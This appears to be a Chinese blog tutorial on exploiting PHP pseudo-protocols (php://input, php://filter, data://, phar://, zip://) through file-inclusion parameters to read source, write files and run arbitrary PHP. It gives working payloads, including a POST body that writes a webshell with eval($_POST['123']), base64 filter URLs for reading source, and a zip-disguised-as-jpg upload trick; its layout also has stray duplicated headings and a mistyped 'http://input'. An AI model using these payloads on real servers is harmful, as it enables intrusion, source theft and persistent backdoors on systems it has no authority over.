# 原创
：  【PHP伪协议】源码读取、文件读写、任意php命令执行

# 【PHP伪协议】源码读取、文件读写、任意php命令执行

**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、概述：](#1.1%E3%80%81%E6%A6%82%E8%BF%B0%EF%BC%9A)

[1.2、12个php支持的伪协议](#1.2%E3%80%8112%E4%B8%AAphp%E6%94%AF%E6%8C%81%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE)

[1.3、前提：](#1.3%E3%80%81%E5%89%8D%E6%8F%90%EF%BC%9A)

[二、示例](#%E4%BA%8C%E3%80%81%E7%A4%BA%E4%BE%8B)

[2.1、file:// ](#2.1%E3%80%81file%3A%2F%2F%C2%A0)

[前提：](#%E5%89%8D%E6%8F%90%EF%BC%9A)

[用法：](#%E7%94%A8%E6%B3%95%EF%BC%9A)

[2.2、php:// 协议](#2.2%E3%80%81php%3A%2F%2F%20%E5%8D%8F%E8%AE%AE)

[前提：](#%E5%89%8D%E6%8F%90%EF%BC%9A)

[php://input](#php%3A%2F%2Finput)

[php://filter](#php%3A%2F%2Ffilter)

[2.3、data://](#2.3%E3%80%81data%3A%2F%2F)

[前提：](#%E5%89%8D%E6%8F%90%EF%BC%9A)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[用法：](#%E7%94%A8%E6%B3%95%EF%BC%9A)

[示例：](#%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[2.4、phar://、zip://、bzip2://、zlib://](#2.4%E3%80%81phar%3A%2F%2F%E3%80%81zip%3A%2F%2F%E3%80%81bzip2%3A%2F%2F%E3%80%81zlib%3A%2F%2F)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[前提：](#%E5%89%8D%E6%8F%90%EF%BC%9A)

[用法：](#%E7%94%A8%E6%B3%95%EF%BC%9A)

[示例：](#%E7%A4%BA%E4%BE%8B%EF%BC%9A)

---


## 一、简介

> 
<h3>1.1、概述：</h3>
PHP 伪协议 是 PHP 支持的协议与封装协议，可利用这些协议完成许多命令执行


### 1.2、12个php支持的伪协议

```
file://        访问本地文件系统
http://        访问 HTTP(s) 网址
ftp://         访问 FTP(s) URLs
php://         访问各个输入/输出流（I/O streams）
zlib://        压缩流
data://        数据（RFC 2397）
glob://        查找匹配的文件路径模式
phar://        PHP 归档
ssh2://        Secure Shell 2
rar://         RAR
ogg://         音频流
expect://      处理交互式的流
```

> 
<h3>1.3、前提：</h3>
php.ini里有两个参数
allow_url_fopen：允许url里的封装协议访问文件（默认ON）
allow_url_include：不允许包含url里的封装协议包含文件（默认OFF）


---


---


## 二、示例

> 
<h3>2.1、file:// </h3>
<h4>前提：</h4>
allow_url_fopen:off/on  
allow_url_include :off/on
即不受allow_url_fopen与allow_url_include的影响
<hr/>
<h4>用法：</h4>
file://文件绝对路径
?file=file://D:/xxxx/1.txt
<hr/>
file=相对路径
?file=./1.txt
<hr/>
file=网址路径
?file=http://127.0.0.1/1.txt


#### 用法：

---


> 
<h3>2.2、php:// 协议</h3>
<h4>前提：</h4>
allow_url_fopen:off/on  
allow_url_include :开on的有php://input php://stdin php://memory php://temp

<hr/>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|协议|介绍
|php://input| 1、可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分 2、在enctype="multipart/form-data" 的时候php://input 是无效的 
|php://output|只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区
|php://fd|(&gt;=5.3.6)允许直接访问指定的文件描述符
|php://memory php://temp| 1、(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据 2、两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 
|php://filter| 1、(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用 2、对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 
</tbody></table>
<hr/>
<h4>php://input</h4>
allow_url_fopen=on 和 allow_url_include=on
POST提交PHP代码，造成任意代码执行，如写入文件（木马）
php://input + [POST DATA]
eg：
URL中：……?file=http://input
POST中：&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST['123'])?&gt;');?&gt;
<hr/>
<h4>php://filter</h4>
读取文件源码
php://filter可获取指定文件源码，如果再利用包含函数漏洞，php://filter流会被当作php文件执行，一般对其进行编码，使其不被执行，获取到编码后解码，从而达到任意文件的读取
……?file=php://filter/read=convert.base64-encode/resource=文件路径


---


#### php://input

> 
<h3>2.3、data://</h3>
<h4>前提：</h4>
allow_url_fopen:on
allow_url_include :on
<hr/>
<h4>简介：</h4>
数据流封装器，以传递相应格式的数据
可以用来执行PHP代码
<hr/>
<h4>用法：</h4>
data://text/plain，内容
data://text/plain;base64,base64加密内容
<hr/>
<h4>示例：</h4>
……?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
……?file=data://text/plain;base64,base64加密后内容


#### 简介：

---


#### 示例：

> 
<h3>2.4、phar://、zip://、bzip2://、zlib://</h3>
<h4>简介：</h4>
用于读取压缩文件，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀
<hr/>
<h4>前提：</h4>
allow_url_fopen:off/on
allow_url_include :off/on
<hr/>
<h4>用法：</h4>
phar://[压缩文件路径]/[压缩文件内的子文件名]
zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（%23为#）
compress.bzip2://file.bz2
<hr/>
<h4>示例：</h4>
1、将php文件添加到压缩文件中（phar）
……?file=phar://D:/……1.zip/1.php
2、将php文件添加到1.zip中，并将1.zip重命名为1.jpg，再上传到目标服务器（zip）
……?file=zip://D:/……1.jpg%231.php
3、压缩1.php为1.bz2（bzip2）
……?file=compress.bzip2://D:/……1.bz2


#### 前提：

---


#### 示例：
